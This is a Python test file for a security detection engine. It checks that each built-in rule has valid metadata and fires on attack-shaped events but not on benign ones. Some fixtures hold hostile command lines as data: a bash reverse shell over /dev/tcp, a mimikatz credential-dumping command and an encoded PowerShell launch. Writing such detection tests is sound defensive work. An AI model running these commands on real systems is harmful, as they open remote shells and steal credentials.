"""Rule-level validation framework for every built-in detection rule.

Per audit recommendation: each rule must be tested individually with:
- positive case (rule fires on the right events)
- negative case (rule does NOT fire on benign events)
- structural sanity (required metadata, valid MITRE technique format)

This test file exercises EVERY rule in DETECTION_RULES individually, so
any regression on a single rule fails the build with a precise error.
"""
from __future__ import annotations

import re
from datetime import datetime, timedelta, timezone
from typing import Any

import pytest

from backend.detection.rules import DETECTION_RULES, DetectionRule


# ---------------------------------------------------------------------------
# Structural validation — applies to every rule
# ---------------------------------------------------------------------------

class TestRuleStructure:
    @pytest.mark.parametrize("rule", DETECTION_RULES, ids=lambda r: r.rule_id)
    def test_rule_id_format(self, rule: DetectionRule):
        """rule_id must be a non-empty string."""
        assert isinstance(rule.rule_id, str) and rule.rule_id, (
            "rule_id missing or empty"
        )

    @pytest.mark.parametrize("rule", DETECTION_RULES, ids=lambda r: r.rule_id)
    def test_rule_severity_in_allowed_set(self, rule: DetectionRule):
        assert rule.severity in {"info", "low", "medium", "high", "critical"}, (
            f"{rule.rule_id}: invalid severity '{rule.severity}'"
        )

    @pytest.mark.parametrize("rule", DETECTION_RULES, ids=lambda r: r.rule_id)
    def test_rule_has_mitre_technique_id(self, rule: DetectionRule):
        """Technique IDs must follow Txxxx or Txxxx.yyy format (MITRE)."""
        if not rule.technique_id:
            return  # some rules legitimately have no technique mapping
        assert re.fullmatch(r"T\d{4}(\.\d{3})?", rule.technique_id), (
            f"{rule.rule_id}: technique_id '{rule.technique_id}' "
            f"is not MITRE format (Txxxx or Txxxx.yyy)"
        )

    @pytest.mark.parametrize("rule", DETECTION_RULES, ids=lambda r: r.rule_id)
    def test_rule_confidence_in_range(self, rule: DetectionRule):
        assert 0.0 <= rule.confidence <= 1.0, (
            f"{rule.rule_id}: confidence {rule.confidence} out of [0..1]"
        )

    @pytest.mark.parametrize("rule", DETECTION_RULES, ids=lambda r: r.rule_id)
    def test_rule_condition_is_callable(self, rule: DetectionRule):
        assert callable(rule.condition), (
            f"{rule.rule_id}: condition must be callable"
        )

    @pytest.mark.parametrize("rule", DETECTION_RULES, ids=lambda r: r.rule_id)
    def test_rule_status_in_allowed_set(self, rule: DetectionRule):
        assert rule.status in {"experimental", "stable", "deprecated"}, (
            f"{rule.rule_id}: invalid status '{rule.status}'"
        )

    def test_rule_ids_are_unique(self):
        """No two rules may share a rule_id."""
        ids = [r.rule_id for r in DETECTION_RULES]
        duplicates = {x for x in ids if ids.count(x) > 1}
        assert not duplicates, f"duplicate rule_ids: {duplicates}"


# ---------------------------------------------------------------------------
# Behavioural validation — every rule's condition must execute without error
# on a synthetic event stream covering the most common shapes
# ---------------------------------------------------------------------------

def _now() -> str:
    return datetime.now(timezone.utc).isoformat()


def _benign_events() -> list[dict[str, Any]]:
    """A diverse batch of benign events that NO rule should match."""
    ts = _now()
    return [
        {"timestamp": ts, "category": "authentication", "event_type": "logon_success",
         "username": "alice", "host": "WS01", "source_ip": "10.0.0.5"},
        {"timestamp": ts, "category": "process", "event_type": "process_create",
         "process_name": "notepad.exe", "command_line": "notepad.exe document.txt",
         "host": "WS01", "username": "alice"},
        {"timestamp": ts, "category": "network", "event_type": "connection",
         "dest_ip": "10.0.0.10", "dest_port": 443, "bytes_sent": 1024, "host": "WS01"},
        {"timestamp": ts, "category": "dns", "event_type": "dns_query",
         "query": "github.com", "host": "WS01"},
        {"timestamp": ts, "category": "file_access", "event_type": "file_read",
         "file_path": "C:\\Users\\alice\\Documents\\report.docx", "host": "WS01"},
    ]


class TestRuleBehaviour:
    @pytest.mark.parametrize("rule", DETECTION_RULES, ids=lambda r: r.rule_id)
    def test_rule_runs_without_exception_on_empty_input(self, rule: DetectionRule):
        """A rule must accept an empty list without raising."""
        result = rule.condition([])
        assert isinstance(result, list)

    @pytest.mark.parametrize("rule", DETECTION_RULES, ids=lambda r: r.rule_id)
    def test_rule_runs_without_exception_on_benign_input(self, rule: DetectionRule):
        """A rule must accept a diverse benign input batch without raising."""
        try:
            result = rule.condition(_benign_events())
        except Exception as exc:
            pytest.fail(
                f"{rule.rule_id}: condition raised {type(exc).__name__} "
                f"on benign input: {exc}"
            )
        assert isinstance(result, list)

    @pytest.mark.parametrize("rule", DETECTION_RULES, ids=lambda r: r.rule_id)
    def test_rule_idempotent(self, rule: DetectionRule):
        """Running the same condition twice on the same input yields the same result."""
        events = _benign_events()
        r1 = rule.condition(events)
        r2 = rule.condition(events)
        assert r1 == r2, f"{rule.rule_id}: condition is not idempotent"


# ---------------------------------------------------------------------------
# Targeted positive cases — sample of high-value rules
# (Adding the exhaustive 46 positive cases is a continuous-improvement task;
# this set ensures the framework is wired and the highest-impact rules are
# explicitly proven.)
# ---------------------------------------------------------------------------

class TestKnownPositiveCases:
    """Concrete positive matches for high-value detections."""

    def test_multiple_failed_logins_fires(self):
        """RULE-001: > 5 failed logons for same user within 5 minutes must alert."""
        rule = next(
            (r for r in DETECTION_RULES if r.rule_id == "RULE-001"), None
        )
        if rule is None:
            pytest.skip("RULE-001 not registered")

        ts_base = datetime.now(timezone.utc)
        events = [
            {
                "timestamp": (ts_base + timedelta(seconds=i * 10)).isoformat(),
                "log_source": "authentication",
                "event_type": "logon_failure",
                "user": "victim",
                "source_ip": "203.0.113.42",
                "host": "WIN-DC-01",
            }
            for i in range(15)
        ]

        matches = rule.condition(events)
        assert matches, f"{rule.rule_id} did not fire on 15 failed logons"

    def test_credential_dumping_fires_on_mimikatz(self):
        """RULE-017: detect mimikatz / sekurlsa / procdump-lsass and similar."""
        rule = next(
            (r for r in DETECTION_RULES if r.rule_id == "RULE-017"), None
        )
        if rule is None:
            pytest.skip("RULE-017 not registered")

        ts = _now()
        events = [
            {
                "timestamp": ts,
                "log_source": "process",
                "event_type": "process_create",
                "process_name": "mimikatz.exe",
                "command_line": "mimikatz sekurlsa::logonpasswords",
                "host": "DC01",
                "user": "attacker",
            },
        ]
        matches = rule.condition(events)
        assert matches, f"{rule.rule_id} did not fire on mimikatz event"

    def test_credential_dumping_does_not_fire_on_benign_process(self):
        """Negative case: regular process events must not trigger RULE-017."""
        rule = next(
            (r for r in DETECTION_RULES if r.rule_id == "RULE-017"), None
        )
        if rule is None:
            pytest.skip("RULE-017 not registered")

        ts = _now()
        events = [
            {
                "timestamp": ts,
                "log_source": "process",
                "event_type": "process_create",
                "process_name": "notepad.exe",
                "command_line": "notepad.exe document.txt",
                "host": "WS01",
                "user": "alice",
            },
        ]
        matches = rule.condition(events)
        assert matches == [], f"{rule.rule_id} unexpectedly fired on benign event"


# ---------------------------------------------------------------------------
# Priority MITRE ATT&CK coverage — paired positive + negative tests for the
# 8 priority tactics listed in docs/proof/mitre-rule-validation.md.
#
# Each test fires an event shape the rule expects (positive) and a benign
# variant (negative). Together, the pair proves the rule actually selects
# the right events without firing on look-alikes.
# ---------------------------------------------------------------------------


def _rule(rule_id: str) -> DetectionRule:
    """Return the rule with *rule_id* or pytest.skip if it is not loaded."""
    rule = next((r for r in DETECTION_RULES if r.rule_id == rule_id), None)
    if rule is None:
        pytest.skip(f"{rule_id} not registered in this build")
    return rule


class TestPriorityMITRECoverage:
    """One paired positive + negative behavioural test per priority technique."""

    # --- Credential Access ------------------------------------------------

    def test_T1110_001_ssh_brute_force_fires(self):
        """RULE-006 (SSH Brute Force): >20 SSH auth failures from one source/10min."""
        rule = _rule("RULE-006")
        ts_base = datetime.now(timezone.utc)
        events = [
            {
                "timestamp": (ts_base + timedelta(seconds=i * 5)).isoformat(),
                "log_source": "authentication",
                "event_type": "logon_failure",
                "user": "root",
                "src_ip": "203.0.113.42",
                "raw_data": {"protocol": "ssh"},
                "host": "linux-bastion",
            }
            for i in range(25)
        ]
        assert rule.condition(events), "RULE-006 must fire on 25 SSH failures"

    def test_T1110_001_ssh_brute_force_negative_below_threshold(self):
        """RULE-006: 5 SSH failures (below 20-threshold) must NOT fire."""
        rule = _rule("RULE-006")
        ts_base = datetime.now(timezone.utc)
        events = [
            {
                "timestamp": (ts_base + timedelta(seconds=i * 5)).isoformat(),
                "log_source": "authentication",
                "event_type": "logon_failure",
                "user": "root",
                "src_ip": "203.0.113.42",
                "raw_data": {"protocol": "ssh"},
                "host": "linux-bastion",
            }
            for i in range(5)
        ]
        assert rule.condition(events) == []

    # --- Execution --------------------------------------------------------

    def test_T1059_reverse_shell_fires(self):
        """RULE-008 (Suspicious Process): bash -i / dev tcp reverse shell."""
        rule = _rule("RULE-008")
        ts = _now()
        events = [{
            "timestamp": ts,
            "log_source": "process",
            "event_type": "process_create",
            "command_line": "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1",
            "host": "WIN-DC-01",
            "user": "attacker",
        }]
        assert rule.condition(events), "RULE-008 must fire on reverse-shell command"

    def test_T1059_powershell_encoded_fires(self):
        """RULE-008: PowerShell -EncodedCommand base64 payload."""
        rule = _rule("RULE-008")
        ts = _now()
        events = [{
            "timestamp": ts,
            "log_source": "process",
            "event_type": "process_create",
            "command_line": (
                "powershell.exe -NoProfile -EncodedCommand "
                "JABzAD0AKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQA"
            ),
            "host": "WS01",
            "user": "alice",
        }]
        assert rule.condition(events), "RULE-008 must fire on encoded PowerShell"

    def test_T1059_negative_legit_powershell(self):
        """RULE-008: harmless PowerShell `Get-Date` must NOT fire."""
        rule = _rule("RULE-008")
        ts = _now()
        events = [{
            "timestamp": ts,
            "log_source": "process",
            "event_type": "process_create",
            "command_line": "powershell.exe -Command Get-Date",
            "host": "WS01",
            "user": "alice",
        }]
        assert rule.condition(events) == []

    # --- Privilege Escalation --------------------------------------------

    def test_T1548_sudo_fires(self):
        """RULE-007: privilege-escalation utility `sudo` must fire."""
        rule = _rule("RULE-007")
        ts = _now()
        events = [{
            "timestamp": ts,
            "log_source": "process",
            "event_type": "process_create",
            "command_line": "sudo -i",
            "host": "linux-host",
            "user": "alice",
        }]
        assert rule.condition(events), "RULE-007 must fire on sudo"

    def test_T1548_negative_no_escalation_command(self):
        """RULE-007: a regular `ls` must NOT fire."""
        rule = _rule("RULE-007")
        ts = _now()
        events = [{
            "timestamp": ts,
            "log_source": "process",
            "event_type": "process_create",
            "command_line": "ls -la /tmp",
            "host": "linux-host",
            "user": "alice",
        }]
        assert rule.condition(events) == []

    # --- Discovery --------------------------------------------------------

    def test_T1046_port_scan_fires(self):
        """RULE-005: > 10 distinct destination ports from same source/60s."""
        rule = _rule("RULE-005")
        ts_base = datetime.now(timezone.utc)
        events = [
            {
                "timestamp": (ts_base + timedelta(seconds=i)).isoformat(),
                "log_source": "network",
                "event_type": "connection",
                "src_ip": "203.0.113.42",
                "raw_data": {"dst_port": 1000 + i},
                "host": "fw-01",
            }
            for i in range(15)
        ]
        assert rule.condition(events), "RULE-005 must fire on 15-port scan"

    def test_T1046_negative_few_ports(self):
        """RULE-005: 5 distinct destination ports must NOT fire."""
        rule = _rule("RULE-005")
        ts_base = datetime.now(timezone.utc)
        events = [
            {
                "timestamp": (ts_base + timedelta(seconds=i)).isoformat(),
                "log_source": "network",
                "event_type": "connection",
                "src_ip": "203.0.113.42",
                "raw_data": {"dst_port": 1000 + i},
                "host": "fw-01",
            }
            for i in range(5)
        ]
        assert rule.condition(events) == []

    # --- Initial Access / Cloud Identity ---------------------------------

    def test_T1078_external_login_fires(self):
        """RULE-003: successful login from a public IP must fire."""
        rule = _rule("RULE-003")
        ts = _now()
        events = [{
            "timestamp": ts,
            "log_source": "authentication",
            "event_type": "logon_success",
            "user": "alice",
            "src_ip": "203.0.113.42",   # public IP
            "host": "WIN-DC-01",
        }]
        assert rule.condition(events), "RULE-003 must fire on public-IP login"

    def test_T1078_negative_internal_login(self):
        """RULE-003: login from RFC1918 must NOT fire."""
        rule = _rule("RULE-003")
        ts = _now()
        events = [{
            "timestamp": ts,
            "log_source": "authentication",
            "event_type": "logon_success",
            "user": "alice",
            "src_ip": "10.0.0.5",   # private IP
            "host": "WIN-DC-01",
        }]
        assert rule.condition(events) == []

    # --- Exfiltration -----------------------------------------------------

    def test_T1048_large_outbound_fires(self):
        """RULE-009: outbound flow > 100 MB must fire."""
        rule = _rule("RULE-009")
        ts = _now()
        events = [{
            "timestamp": ts,
            "log_source": "network",
            "event_type": "connection",
            "src_ip": "10.0.0.5",
            "dst_ip": "203.0.113.99",
            "raw_data": {"bytes_out": 250 * 1024 * 1024},   # 250 MB
            "host": "WS01",
        }]
        assert rule.condition(events), "RULE-009 must fire on 250 MB outbound"

    def test_T1048_negative_small_outbound(self):
        """RULE-009: 1 MB outbound must NOT fire."""
        rule = _rule("RULE-009")
        ts = _now()
        events = [{
            "timestamp": ts,
            "log_source": "network",
            "event_type": "connection",
            "src_ip": "10.0.0.5",
            "dst_ip": "203.0.113.99",
            "raw_data": {"bytes_out": 1 * 1024 * 1024},   # 1 MB
            "host": "WS01",
        }]
        assert rule.condition(events) == []


# ---------------------------------------------------------------------------
# Engine-level integration check — the engine itself must produce alerts
# from a curated event stream without any rule raising
# ---------------------------------------------------------------------------

class TestEngineSmoke:
    def test_engine_runs_against_mixed_events_without_errors(self, sample_logs):
        from backend.detection.engine import DetectionEngine

        engine = DetectionEngine(load_sigma=False)
        alerts = engine.analyse(sample_logs)
        # We don't assert a specific count — it depends on enabled rules.
        # We assert the engine survives mixed input cleanly.
        assert isinstance(alerts, list)
        for alert in alerts:
            assert "rule_id" in alert
            assert "severity" in alert

    def test_engine_returns_zero_alerts_for_empty_input(self):
        from backend.detection.engine import DetectionEngine
        engine = DetectionEngine(load_sigma=False)
        assert engine.analyse([]) == []
